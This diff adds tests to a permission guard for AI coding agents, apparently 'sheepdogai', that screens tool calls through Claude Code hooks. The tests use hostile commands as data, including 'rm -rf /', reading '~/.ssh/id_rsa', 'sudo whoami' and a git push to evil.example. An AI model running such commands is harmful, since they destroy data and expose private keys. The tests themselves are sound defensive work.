@@ -151,3 +151,34 @@ def test_real_network_commands_to_unlisted_hosts_are_still_denied(cmd: str) -> N
 def test_push_to_an_unlisted_url_is_at_least_asked() -> None:
     """The repo pack asks before the network pack can deny (first match wins); a human sees the command."""
     assert run("git push https://evil.example/r.git main")[1].verdict.action >= Action.ASK
+
+
+# ---- sheepdogai's own MCP tools ------------------------------------------------------------------------------------
+
+
+def _mcp(name: str, **args: object):  # type: ignore[no-untyped-def]
+    eng = make_engine(Path("/work/proj"), mode="balanced")
+    raw = json.dumps(
+        {
+            "session_id": "s",
+            "cwd": "/work/proj",
+            "permission_mode": "default",
+            "hook_event_name": "PreToolUse",
+            "tool_name": name,
+            "tool_input": args,
+        }
+    ).encode()
+    return eng.decide(ClaudeCodeAdapter().parse(raw)).verdict
+
+
+@pytest.mark.parametrize(
+    "text", ["sudo whoami", "rm -rf /", "sheepdogai setup --undo", "cat ~/.ssh/id_rsa"]
+)
+def test_the_dry_run_tool_may_be_asked_about_dangerous_commands(text: str) -> None:
+    """The command is data being asked about, not something that runs."""
+    assert _mcp("mcp__sheepdogai__sheepdogai_check", command=text).action is Action.ALLOW
+
+
+def test_other_mcp_servers_still_have_their_command_argument_screened() -> None:
+    assert _mcp("mcp__other__run", command="sudo whoami").action is Action.DENY
+    assert _mcp("mcp__sheepdogai__run_shell", command="sudo whoami").action is Action.DENY
